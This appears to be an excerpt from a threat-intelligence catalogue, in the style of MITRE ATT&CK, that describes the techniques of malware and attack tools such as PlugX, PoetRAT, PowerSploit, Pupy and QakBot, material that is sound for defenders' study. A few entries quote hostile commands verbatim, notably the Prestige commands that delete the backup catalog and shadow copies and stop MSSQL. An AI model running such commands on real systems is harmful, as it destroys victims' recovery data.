PipeMon modules are stored on disk with seemingly benign names including use of a file extension associated with a popular word processor.
PipeMon has modified the Registry to store its encrypted payload.
PipeMon's first stage has been executed by a call to &lt;code&gt;CreateProcess&lt;/code&gt; with the decryption password in an argument. PipeMon has used a call to &lt;code&gt;LoadLibrary&lt;/code&gt; to load its installer.
The PipeMon communication module can use a custom protocol based on TLS over TCP.
PipeMon can use parent PID spoofing to elevate privileges.
The PipeMon installer has modified the Registry key &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors&lt;/code&gt; to install PipeMon as a Print Processor.
PipeMon can iterate over the running processes to find a suitable injection target.
PipeMon can check for the presence of ESET and Kaspersky security software.
PipeMon has used call to &lt;code&gt;LoadLibrary&lt;/code&gt; to load its installer. PipeMon loads its modules using reflective loading or custom shellcode.
PipeMon communications are RC4 encrypted.
PipeMon can collect and send OS version and computer name as a part of its C2 beacon.
PipeMon can collect and send the local IP address, RDP information, and the network adapter physical address as a part of its C2 beacon.
PipeMon can send time zone information from a compromised host to C2.
PipeMon can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts.
Pisloader uses DNS as its C2 protocol.
Pisloader has commands to list drives on the victim machine and to list file information for a given directory.
Pisloader has a command to upload a file to the victim machine.
Pisloader obfuscates files by splitting strings into smaller sub-strings and including "garbage" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data.
Pisloader establishes persistence via a Registry Run key.
Responses from the Pisloader C2 server are base32-encoded.
Pisloader has a command to collect victim system information, including the system name and OS version.
Pisloader has a command to collect the victim's IP address.
Pisloader uses cmd.exe to set the Registry Run key value. It also has a command to spawn a command shell.
PlugX has the ability to use DLL search order hijacking for installation on targeted systems.
PlugX has used DLL side-loading to evade anti-virus.
PlugX can be configured to use DNS for command and control.
PlugX uses Pastebin to store C2 addresses.
PlugX decompresses and decrypts itself using the Microsoft API call RtlDecompressBuffer.
PlugX has a module to enumerate drives and find files recursively.
PlugX can modify the characteristics of folders to hide them from the compromised user.
PlugX has a module to download and execute files on the compromised machine.
PlugX has a module for capturing keystrokes per process including window titles.
A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques.
In one instance, menuPass added PlugX as a service with a display name of "Corel Writing Tools Utility."
PlugX has been disguised as legitimate Adobe and PotPlayer files.
PlugX has a module to create, delete, or modify Registry keys.
PlugX can use the Windows API functions `GetProcAddress`, `LoadLibrary`, and `CreateProcess` to execute another process.
PlugX has a module to enumerate network shares.
PlugX can be configured to use raw TCP or UDP for command and control.
PlugX can use API hashing and modify the names of strings to evade detection.
PlugX has a module to list the processes running on a machine.
PlugX can enumerate and query for information contained within the Windows Registry.
PlugX adds Run key entries in the Registry to establish persistence.
PlugX allows the operator to capture screenshots.
PlugX can use RC4 encryption in C2 communications.
PlugX checks if VMware tools is running in the background by searching for any process named "vmtoolsd".
PlugX has a module for enumerating TCP and UDP network connections and associated processes using the &lt;code&gt;netstat&lt;/code&gt; command.
PlugX can be configured to use HTTP for command and control.
PlugX allows actors to spawn a reverse shell on a victim.
PlugX can be added as a service to establish persistence. PlugX also has a module to change service configurations as well as start, control, and delete services.
PoetRAT has the ability to compress files with zip.
PoetRAT used TLS to encrypt command and control (C2) communications.
PoetRAT used file system monitoring to track modification and enable automatic exfiltration.
PoetRAT has `pyminifier` to obfuscate scripts.
PoetRAT has executed a Lua script through a Lua interpreter for Windows.
PoetRAT has used a Python tool named Browdec.exe to steal browser credentials.
PoetRAT has used LZMA and base64 libraries to decode obfuscated scripts.
PoetRAT was delivered with documents using DDE to execute malicious code.
PoetRAT has used a .NET tool named dog.exe to exiltrate information over an e-mail account.
PoetRAT has exfiltrated data over the C2 channel.
PoetRAT has used ftp for exfiltration.
PoetRAT has the ability to overwrite scripts and delete itself if a sandbox environment is detected.
PoetRAT has used FTP for C2 communications.
PoetRAT has the ability to list files upon receiving the &lt;code&gt;ls&lt;/code&gt; command from C2.
PoetRAT has the ability to hide and unhide files.
PoetRAT has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.
PoetRAT has used a Python tool named klog.exe for keylogging.
PoetRAT used voStro.exe, a compiled pypykatz (Python version of Mimikatz), to steal credentials.
PoetRAT has used spearphishing attachments to infect victims.
PoetRAT has made registry modifications to alter its behavior upon execution.
PoetRAT used TLS to encrypt communications over port 143
PoetRAT has used a custom encryption scheme for communication between scripts.
PoetRAT has the ability to list all running processes.
PoetRAT was executed with a Python script and worked in conjunction with additional Python-based post-exploitation tools.
PoetRAT has added a registry key in the &lt;RUN&gt; hive for persistence.
PoetRAT used Nmap for remote system discovery.
PoetRAT has the ability to take screen captures.
PoetRAT was distributed via malicious Word documents.
PoetRAT checked the size of the hard drive to determine if it was being run in a sandbox environment. In the event of sandbox detection, it would delete itself by overwriting the malware scripts with the contents of "License.txt" and exiting.
PoetRAT has the ability to gather information about the compromised host.
PoetRAT sent username, computer name, and the previously generated UUID in reply to a "who" command from C2.
PoetRAT has used a Python tool named Bewmac to record the webcam on compromised hosts.
PoetRAT has used Word documents with VBScripts to execute malicious activities.
PoetRAT has used HTTP and HTTPs for C2 communications.
PoetRAT has called cmd through a Word document macro.
PoisonIvy creates a Registry key in the Active Setup pointing to a malicious executable.
PoisonIvy captures window titles.
PoisonIvy creates a backdoor through which remote attackers can steal system information.
PoisonIvy can inject a malicious DLL into a process.
PoisonIvy creates a backdoor through which remote attackers can upload files.
PoisonIvy contains a keylogger.
PoisonIvy stages collected data in a text file.
PoisonIvy creates a Registry subkey that registers a new system device.
PoisonIvy hides any strings related to its own indicators of compromise.
PoisonIvy creates run key Registry entries pointing to a malicious executable dropped to disk.
PoisonIvy starts a rootkit from a malicious file dropped to disk.
PoisonIvy uses the Camellia cipher to encrypt communications.
PoisonIvy creates a backdoor through which remote attackers can open a command-line interface.
PoisonIvy creates a Registry subkey that registers a new service. PoisonIvy also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.
PolyglotDuke can use Twitter, Reddit, Imgur and other websites to get a C2 URL.
PolyglotDuke can use a custom algorithm to decrypt strings used by the malware.
PolyglotDuke can store encrypted JSON configuration files in the Registry.
PolyglotDuke can retrieve payloads from the C2 server.
PolyglotDuke can write encrypted JSON configuration files to the Registry.
PolyglotDuke can use &lt;code&gt;LoadLibraryW&lt;/code&gt; and &lt;code&gt;CreateProcess&lt;/code&gt; to load and execute code.
PolyglotDuke can custom encrypt strings.
PolyglotDuke can be executed using rundll32.exe.
PolyglotDuke can use steganography to hide C2 information in images.
PolyglotDuke has has used HTTP GET requests in C2 communications.
Pony has used scripts to delete itself after execution.
Pony can download additional files onto the infected system.
Pony has used the &lt;code&gt;NetUserEnum&lt;/code&gt; function to enumerate local accounts.
Pony has attempted to lure targets into downloading an attached executable (ZIP, RAR, or CAB archives) or document (PDF or other MS Office format).
Pony has attempted to lure targets into clicking links in spoofed emails from legitimate banks.
Pony has used the Adobe Reader icon for the downloaded file to look more trustworthy.
Pony has used several Windows functions for various purposes.
Pony attachments have been delivered via compressed archive files. Pony also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult.
Pony has used a small dictionary of common passwords against a collected list of local accounts.
Pony has been delivered via spearphishing attachments.
Pony has been delivered via spearphishing emails which contained malicious links.
Pony has collected the Service Pack, language, and region information to send to the C2.
Pony has delayed execution using a built-in function to avoid detection and analysis.
Pony has sent collected information to the C2 via HTTP POST request.
Pony has used batch scripts to delete itself after execution.
PoshC2 can use Invoke-TokenManipulation for manipulating tokens.
PoshC2 contains a module for compressing data using ZIP.
PoshC2 contains a module for recursively parsing through files and directories to gather valid credit card numbers.
PoshC2 has modules for brute forcing local administrator and AD user accounts.
PoshC2 can utilize multiple methods to bypass UAC.
PoshC2 can use Invoke-RunAs to make tokens.
PoshC2 contains modules for searching for passwords in local and remote files.
PoshC2 can decrypt passwords stored in the RDCMan configuration file.
PoshC2 can enumerate local and domain user account information.
PoshC2 has modules for enumerating domain trusts.
PoshC2 contains modules for local privilege escalation exploits such as CVE-2016-9192 and CVE-2016-0099.
PoshC2 contains a module for exploiting SMB via EternalBlue.
PoshC2 can enumerate files on the local file system and includes a module for enumerating recently accessed files.
PoshC2 has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.
PoshC2 can use Inveigh to conduct name service poisoning for credential theft and associated relay attacks.
PoshC2 contains an implementation of Mimikatz to gather credentials from memory.
PoshC2 can enumerate local and domain user account information.
PoshC2 contains modules, such as &lt;code&gt;Get-LocAdm&lt;/code&gt; for enumerating permission groups.
PoshC2 can perform port scans from an infected host.
PoshC2 contains a module for taking packet captures on compromised hosts.
PoshC2 has a number of modules that leverage pass the hash for lateral movement.
PoshC2 can use &lt;code&gt;Get-PassPol&lt;/code&gt; to enumerate the domain password policy.
PoshC2 contains multiple modules for injecting into processes, such as &lt;code&gt;Invoke-PSInject&lt;/code&gt;.
PoshC2 contains modules that allow for use of proxies in command and control.
PoshC2 contains an implementation of PsExec for remote execution.
PoshC2 contains modules, such as &lt;code&gt;Get-ComputerInfo&lt;/code&gt;, for enumerating common system information.
PoshC2 can enumerate network adapter information.
PoshC2 contains an implementation of netstat to enumerate TCP and UDP connections.
PoshC2 can enumerate service and service permission information.
PoshC2 can use protocols like HTTP/HTTPS for command and control traffic.
PoshC2 has a number of modules that use WMI to execute tasks.
PoshC2 has the ability to persist on a system using WMI events.
PowGoop can side-load `Goopdate.dll` into `GoogleUpdate.exe`.
PowGoop can decrypt PowerShell scripts for execution.
PowGoop can receive encrypted commands from C2.
PowGoop has disguised a PowerShell script as a .dat file (goopdate.dat).
PowGoop has used a DLL named Goopdate.dll to impersonate a legitimate Google update file.
PowGoop can use a modified Base64 encoding mechanism to send data to and from the C2 server.
PowGoop has the ability to use PowerShell scripts to execute commands.
PowGoop can send HTTP GET requests to malicious servers.
Power Loader overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.
PowerDuke has a command to get text of the current foreground window.
PowerDuke has a command to write random data across a file and delete it.
PowerDuke has a command to write random data across a file and delete it.
PowerDuke has commands to get the current directory name as well as the size of a file. It also has commands to obtain information about logical drives, drive type, and free space.
PowerDuke has a command to download a file.
PowerDuke hides many of its backdoor payloads in an alternate data stream (ADS).
PowerDuke has a command to list the victim's processes.
PowerDuke achieves persistence by using various Registry Run keys.
PowerDuke uses rundll32.exe to load.
PowerDuke uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).
PowerDuke has commands to get information about the victim's name, build, version, serial number, and memory usage.
PowerDuke has a command to get the victim's domain and NetBIOS name.
PowerDuke has commands to get the current user's name and SID.
PowerDuke has commands to get the time the machine was built, the time, and the time zone.
PowerDuke runs &lt;code&gt;cmd.exe /c&lt;/code&gt; and sends the output to its C2.
PowerLess can encrypt browser database files prior to exfiltration.
PowerLess has a browser info stealer module that can read Chrome and Edge browser database files.
PowerLess has the ability to exfiltrate data, including Chrome and Edge browser database files, from compromised machines.
PowerLess can use base64 and AES ECB decryption prior to execution of downloaded modules.
PowerLess can use an encrypted channel for C2 communications.
PowerLess can download additional payloads to a compromised host.
PowerLess can use a module to log keystrokes.
PowerLess can stage stolen browser data in `C:\\Windows\\Temp\\cup.tmp` and keylogger data in `C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK`.
PowerLess is written in and executed via PowerShell without using powershell.exe.
PowerPunch can use Base64-encoded scripts.
PowerPunch can use the volume serial number from a target host to generate a unique XOR key for the next stage payload.
PowerPunch can download payloads from adversary infrastructure.
PowerPunch has the ability to execute through PowerShell.
PowerShower has used 7Zip to compress .txt, .pdf, .xls or .doc files prior to exfiltration.
PowerShower has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.
PowerShower has the ability to remove all files created during the dropper process.
PowerShower has added a registry key so future powershell.exe instances are spawned with coordinates for a window position off-screen by default.
PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.
PowerShower is a backdoor written in PowerShell.
PowerShower has the ability to deploy a reconnaissance module to retrieve a list of the active processes.
PowerShower sets up persistence with a Registry run key.
PowerShower has the ability to encode C2 communications with base64 encoding.
PowerShower has collected system information on the infected host.
PowerShower has the ability to identify the current Windows domain of the infected host.
PowerShower has the ability to identify the current user on the infected host.
PowerShower has the ability to save and execute VBScript.
PowerShower has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.
PowerSploit's &lt;code&gt;Invoke-TokenManipulation&lt;/code&gt; Exfiltration module can be used to manipulate tokens.
PowerSploit's &lt;code&gt;Get-MicrophoneAudio&lt;/code&gt; Exfiltration module can record system microphone audio.
PowerSploit contains a collection of ScriptModification modules that compress and encode scripts and payloads.
PowerSploit has several modules that search the Windows Registry for stored credentials: &lt;code&gt;Get-UnattendedInstallFile&lt;/code&gt;, &lt;code&gt;Get-Webconfig&lt;/code&gt;, &lt;code&gt;Get-ApplicationHost&lt;/code&gt;, &lt;code&gt;Get-SiteListPassword&lt;/code&gt;, &lt;code&gt;Get-CachedGPPPassword&lt;/code&gt;, and &lt;code&gt;Get-RegistryAutoLogon&lt;/code&gt;.
PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.
PowerSploit contains a collection of Exfiltration modules that can access data from local files, volumes, and processes.
PowerSploit has modules such as &lt;code&gt;Get-NetDomainTrust&lt;/code&gt; and &lt;code&gt;Get-NetForestTrust&lt;/code&gt; to enumerate domain and forest trusts.
PowerSploit contains a collection of CodeExecution modules that inject code (DLL, shellcode) into a process.
PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences.
PowerSploit's &lt;code&gt;Find-AVSignature&lt;/code&gt; AntivirusBypass module can be used to locate single byte anti-virus signatures.
PowerSploit's &lt;code&gt;Invoke-Kerberoast&lt;/code&gt; module can request service tickets and return crackable ticket hashes.
PowerSploit's &lt;code&gt;Get-Keystrokes&lt;/code&gt; Exfiltration module can log keystrokes.
PowerSploit contains a collection of Exfiltration modules that can harvest credentials using Mimikatz.
PowerSploit's &lt;code&gt;Get-ProcessTokenGroup&lt;/code&gt; Privesc-PowerUp module can enumerate all SIDs associated with its current token.
PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.
PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.
PowerSploit contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.
PowerSploit modules are written in and executed via PowerShell.
PowerSploit's &lt;code&gt;Get-ProcessTokenPrivilege&lt;/code&gt; Privesc-PowerUp module can enumerate privileges for a given process.
PowerSploit contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.
PowerSploit reflectively loads a Windows PE file into a process.
PowerSploit's &lt;code&gt;New-UserPersistenceOption&lt;/code&gt; Persistence argument can be used to establish via the &lt;code&gt;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; Registry key.
PowerSploit's &lt;code&gt;New-UserPersistenceOption&lt;/code&gt; Persistence argument can be used to establish via a Scheduled Task/Job.
PowerSploit's &lt;code&gt;Get-TimedScreenshot&lt;/code&gt; Exfiltration module can take screenshots at regular intervals.
PowerSploit's &lt;code&gt;Install-SSP&lt;/code&gt; Persistence module can be used to establish by installing a SSP DLL.
PowerSploit contains a collection of Exfiltration modules that can harvest credentials from Windows vault credential objects.
PowerSploit's &lt;code&gt;Invoke-WmiCommand&lt;/code&gt; CodeExecution module uses WMI to execute and retrieve the output from a PowerShell payload.
PowerSploit contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs.
PowerStallion uses Microsoft OneDrive as a C2 server via a network drive mapped with &lt;code&gt;net use&lt;/code&gt;.
PowerStallion uses a XOR cipher to encrypt command output written to its OneDrive C2 server.
PowerStallion uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.
PowerStallion has been used to monitor process lists.
PowerStallion modifies the MAC times of its local log files to match that of the victim's desktop.ini file.
Prestige has leveraged the CryptoPP C++ library to encrypt files on target systems using AES and appended filenames with `.enc`.
Prestige can traverse the file system to discover files to encrypt by identifying specific extensions defined in a hardcoded list.
Prestige has been deployed using the Default Domain Group Policy Object from an Active Directory Domain Controller.
Prestige can delete the backup catalog from the target system using: `c:\Windows\System32\wbadmin.exe delete catalog -quiet` and can also delete volume shadow copies using: `\Windows\System32\vssadmin.exe delete shadows /all /quiet`.
Prestige has the ability to register new registry keys for a new extension handler via `HKCR\.enc` and `HKCR\enc\shell\open\command`.
Prestige has used the `Wow64DisableWow64FsRedirection()` and `Wow64RevertWow64FsRedirection()` functions to disable and restore file system redirection.
Prestige can use PowerShell for payload execution on targeted systems.
Prestige has been executed on a target system through a scheduled task created by Sandworm Team using Impacket.
Prestige has attempted to stop the MSSQL Windows service to ensure successful encryption using `C:\Windows\System32\net.exe stop MSSQLSERVER`.
After collecting documents from removable media, Prikormka compresses the collected files, and encrypts it with Blowfish.
A module in Prikormka collects passwords stored in applications installed on the victim.
A module in Prikormka gathers logins and passwords stored in applications on the victims, including Google Chrome, Mozilla Firefox, and several other browsers.
Prikormka uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory.
Prikormka contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.
Some resources in Prikormka are encrypted with a simple XOR operation or encoded with Base64.
After encrypting its own log files, the log encryption module in Prikormka deletes the original, unencrypted files from the host.
A module in Prikormka collects information about the paths, size, and creation time of files with specific file extensions, but not the actual content of the file.
Prikormka contains a keylogger module that collects keystrokes and the titles of foreground windows.
Prikormka creates a directory, &lt;code&gt;%USERPROFILE%\AppData\Local\SKC\&lt;/code&gt;, which is used to store collected log files.
A module in Prikormka collects information on available printers and disk drives.
Prikormka adds itself to a Registry Run key with the name guidVGA or guidVSA.
Prikormka uses rundll32.exe to load its DLL.
Prikormka contains a module that captures screenshots of the victim's desktop.
A module in Prikormka collects information from the victim about installed anti-virus software.
Prikormka encodes C2 traffic with Base64.
Prikormka encrypts some C2 traffic with the Blowfish cipher.
A module in Prikormka collects information from the victim about Windows OS version, computer name, battery info, and physical memory.
A module in Prikormka collects information from the victim about its IP addresses and MAC addresses.
A module in Prikormka collects information from the victim about the current user name.
ProLock can use BITS jobs to download its malicious payload.
ProLock can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024.
ProLock can use CVE-2019-0859 to escalate privileges on a compromised host.
ProLock can remove files containing its payload after they are executed.
ProLock can use vssadmin.exe to remove volume shadow copies.
ProLock can use .jpg and .bmp files to store its payload.
ProLock can use WMIC to execute scripts on targeted hosts.
Proton zips up files before exfiltrating them.
Proton removes logs from &lt;code&gt;/var/logs&lt;/code&gt; and &lt;code&gt;/Library/logs&lt;/code&gt;.
Proton gathers credentials for Google Chrome.
Proton uses an encrypted file to store commands and configuration values.
Proton kills security tools like Wireshark that are running.
Proton removes all files in the /tmp directory.
Proton prompts users for their credentials.
Proton gathers credentials in files for keychains.
Proton uses a keylogger to capture keystrokes.
Proton persists via Launch Agent.
Proton gathers credentials in files for 1password.
Proton captures the content of the desktop with the screencapture binary.
Proton modifies the tty_tickets line in the sudoers file.
Proton uses macOS' .command file type to script actions.
Proton uses VNC to connect into systems.
Proxysvc automatically collects data about the victim and sends it to the control server.
Proxysvc can overwrite files indicated by the attacker before deleting them.
Proxysvc searches the local system and gathers data.
Proxysvc performs data exfiltration over the control server channel using a custom protocol.
Proxysvc can delete files indicated by the attacker and remove itself from disk using a batch file.
Proxysvc lists files in directories.
Proxysvc lists processes running on the system.
Proxysvc gathers product names from the Registry key: &lt;code&gt;HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName&lt;/code&gt; and the processor description from the Registry key &lt;code&gt;HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString&lt;/code&gt;.
Proxysvc registers itself as a service on the victim’s machine to run as a standalone process.
Proxysvc collects the OS version, country name, MAC address, computer name, physical memory statistics, and volume information for all drives on the system.
Proxysvc collects the network adapter information and domain/username information based on current remote sessions.
As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server.
Proxysvc uses HTTP over SSL to communicate commands with the control server.
Proxysvc executes a binary on the system and logs the results into a temp file by using: &lt;code&gt;cmd.exe /c "&lt;file_path&gt; &gt; %temp%\PM* .tmp 2&gt;&amp;1"&lt;/code&gt;.
PsExec has the ability to remotely create accounts on target systems.
PsExec can be used to download or upload a file over a network share.
PsExec, a tool that has been used by adversaries, writes programs to the &lt;code&gt;ADMIN$&lt;/code&gt; network share to execute commands on remote systems.
Microsoft Sysinternals PsExec is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.
PsExec can leverage Windows services to escalate privileges from administrator to SYSTEM with the &lt;code&gt;-s&lt;/code&gt; argument.
Psylo exfiltrates data to its C2 server over the same protocol as C2 communications.
Psylo has commands to enumerate all storage devices and to find all files that start with a particular string.
Psylo has a command to download a file to the system from its C2 server.
Psylo has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.
Psylo uses HTTPS for C2.
Pteranodon can decrypt encrypted data strings prior to using them.
Pteranodon can use a dynamic Windows hashing algorithm to map API components.
Pteranodon exfiltrates screenshot files to its C2 server.
Pteranodon can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.
Pteranodon identifies files matching certain file extension and copies them to subdirectories it created.
Pteranodon can download and execute additional files.
Pteranodon creates various subdirectories under &lt;code&gt;%Temp%\reports\%&lt;/code&gt; and copies files to those subdirectories. It also creates a folder at &lt;code&gt;C:\Users\&lt;Username&gt;\AppData\Roaming\Microsoft\store&lt;/code&gt; to store screenshot JPEG files.
Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.
Pteranodon has used various API calls.
Pteranodon copies itself to the Startup folder to establish persistence.
Pteranodon executes functions using rundll32.exe.
Pteranodon schedules tasks to invoke its components in order to establish persistence.
Pteranodon can capture screenshots at a configurable interval.
Pteranodon has the ability to use anti-detection functions to identify sandbox environments.
Pteranodon can use a malicious VBS file for execution.
Pteranodon can use HTTP for C2.
Pteranodon can use `cmd.exe` for execution on victim systems.
Pupy can compress data with Zip before sending it over C2.
Pupy's default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.
Pupy can record sound with the microphone.
Pupy can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.
Pupy can use Lazagne for harvesting credentials.
Pupy has a module to clear event logs with PowerShell.
Pupy can use Lazagne for harvesting credentials.
Pupy can use Lazagne for harvesting credentials.
Pupy can use Lazagne for harvesting credentials.
Pupy can user PowerView to execute “net user” commands and create domain accounts.
Pupy can migrate into another process using reflective DLL injection.
Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.
Pupy can walk through directories and recursively search for strings in files.
Pupy can upload and download to/from a victim machine.
Pupy uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.
Pupy can sniff plaintext network credentials and use NBNS Spoofing to poison name services.
Pupy can use Lazagne for harvesting credentials.
Pupy can execute Lazagne as well as Mimikatz using PowerShell.
Pupy uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.
Pupy can user PowerView to execute “net user” commands and create local system accounts.
Pupy can interact with a victim’s Outlook session and look through folders and emails.
Pupy has a built-in module for port scanning.
Pupy can list local and remote shared drives and folders over SMB.
Pupy can also perform pass-the-ticket.
Pupy has a module for loading and executing PowerShell scripts.
Pupy can list the running processes and get the process ID and parent process’s ID.
Pupy can use an add on feature when creating payloads that allows you to create custom Python scripts (“scriptlets”) to perform tasks offline (without requiring a session) such as sandbox detection, adding persistence, etc.
Pupy adds itself to the startup folder or adds itself to the Registry key &lt;code&gt;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&lt;/code&gt; for persistence.
Pupy can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.
Pupy can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.
Pupy uses PsExec to execute a payload or commands on a remote host.
Pupy has a module that checks a number of indicators on the system to determine if its running on a virtual machine.
Pupy can grab a system’s information including the OS version, architecture, etc.
Pupy has built in commands to identify a host’s IP address and find out other network configuration settings by viewing connected sessions.
Pupy has a built-in utility command for &lt;code&gt;netstat&lt;/code&gt;, can do net session through PowerView, and has an interactive shell which can be used to discover additional information.
Pupy can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.
Pupy can be used to establish persistence using a systemd service.
Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.
Pupy can access a connected webcam and capture pictures.
Pupy can communicate over HTTP for C2.
Pupy can use an XDG Autostart to establish persistence.
PyDCrypt has decrypted and dropped the DCSrv payload to disk.
PyDCrypt has modified firewall rules to allow incoming SMB, NetBIOS, and RPC connections using `netsh.exe` on remote machines.
PyDCrypt has been compiled and encrypted with PyInstaller, specifically using the --key flag during the build phase.
PyDCrypt will remove all created artifacts such as dropped executables.
PyDCrypt has dropped DCSrv under the `svchost.exe` name to disk.
PyDCrypt has attempted to execute with PowerShell.
PyDCrypt, along with its functions, is written in Python.
PyDCrypt has used netsh to find RPC connections on remote machines.
PyDCrypt has probed victim machines with &lt;code&gt;whoami&lt;/code&gt; and has collected the username from the machine.
PyDCrypt has used `cmd.exe` for execution.
PyDCrypt has attempted to execute with WMIC.
Pysa has used brute force attempts against a central management console, as well as some Active Directory accounts.
Pysa has extracted credentials from the password database before encrypting the files.
Pysa has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions.
Pysa has the capability to stop antivirus services and disable Windows Defender.
Pysa has deleted batch files after execution.
Pysa has the functionality to delete shadow copies.
Pysa can perform OS credential dumping using Mimikatz.
Pysa has executed a malicious executable by naming it svchost.exe.
Pysa has modified the registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System” and added the ransom note.
Pysa can perform network reconnaissance using the Advanced Port Scanner tool.
Pysa has used Powershell scripts to deploy its ransomware.
Pysa has used Python scripts to deploy ransomware.
Pysa has laterally moved using RDP connections.
Pysa has used PsExec to copy and execute the ransomware.
Pysa can stop services and processes.
Pysa can perform network reconnaissance using the Advanced IP Scanner tool.
QUADAGENT was likely obfuscated using `Invoke-Obfuscation`.
QUADAGENT uses DNS for C2 communications.
QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.
QUADAGENT uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.
QUADAGENT has a command to delete its Registry key and scheduled task.
QUADAGENT stores a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications within a Registry key (such as `HKCU\Office365DCOMCheck`) in the `HKCU` hive.
QUADAGENT used the PowerShell filenames &lt;code&gt;Office365DCOMCheck.ps1&lt;/code&gt; and &lt;code&gt;SystemDiskClean.ps1&lt;/code&gt;.
QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.
QUADAGENT uses PowerShell scripts for execution.
QUADAGENT checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.
QUADAGENT creates a scheduled task to maintain persistence on the victim’s machine.
QUADAGENT encodes C2 communications with base64.
QUADAGENT gathers the current domain the victim system belongs to.
QUADAGENT gathers the victim username.
QUADAGENT uses VBScripts.
QUADAGENT uses HTTPS and HTTP for C2 communications.
QUADAGENT uses cmd.exe to execute scripts and commands on the victim’s machine.
QUIETCANARY has the ability to stage data prior to exfiltration.
QUIETCANARY can use a custom parsing routine to decode the command codes and additional parameters from the C2 before executing them.
QUIETCANARY can execute processes in a hidden window.
QUIETCANARY can call `System.Net.HttpWebRequest` to identify the default proxy configured on the victim computer.
QUIETCANARY has the ability to retrieve information from the Registry.
QUIETCANARY can base64 encode C2 communications.
QUIETCANARY can RC4 encrypt C2 communications.
QUIETCANARY can identify the default proxy setting on a compromised host.
QUIETCANARY can use HTTPS for C2 communications.
QUIETEXIT can use an inverse negotiated SSH connection as part of its C2.
QUIETEXIT can proxy traffic via SOCKS.
QUIETEXIT can attempt to connect to a second hard-coded C2 if the first hard-coded C2 address fails.
QUIETEXIT has attempted to change its name to `cron` upon startup. During incident response, QUIETEXIT samples have been identified that were renamed to blend in with other legitimate files.
QUIETEXIT can establish a TCP connection as part of its initial connection to the C2.
QakBot has the ability to enumerate windows on a compromised host.
QakBot can use large file sizes to evade detection.
QakBot can use advanced web injects to steal web banking credentials.
QakBot can conduct brute force attacks to capture credentials.
QakBot can use signed loaders to evade detection.
QakBot can use obfuscated and encoded scripts.
QakBot has collected usernames and passwords from Firefox and Chrome.
QakBot has the ability to use DLL side-loading for execution.
QakBot can use a variety of commands, including esentutl.exe to steal sensitive data from Internet Explorer and Microsoft Edge, to acquire information that is subsequently exfiltrated.
QakBot can deobfuscate and re-assemble code strings for execution.
QakBot has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.
QakBot can use domain generation algorithms in C2 communication.
QakBot can run &lt;code&gt;nltest /domain_trusts /all_trusts&lt;/code&gt; for domain trust discovery.
QakBot can send stolen information to C2 nodes including passwords, accounts, and emails.
QakBot can move laterally using worm-like functionality through exploitation of SMB.
QakBot has a module that can proxy C2 communications.
QakBot can delete folders and files including overwriting its executable with legitimate programs.
QakBot can identify whether it has been run previously on a host by checking for a specified folder.
QakBot can store its configuration information in a randomly named subkey under &lt;code&gt;HKCU\Software\Microsoft&lt;/code&gt;.
QakBot has been delivered in ZIP files via HTML smuggling.
QakBot has placed its payload in hidden subdirectories.
QakBot can make small changes to itself in order to change its checksum and hash value.
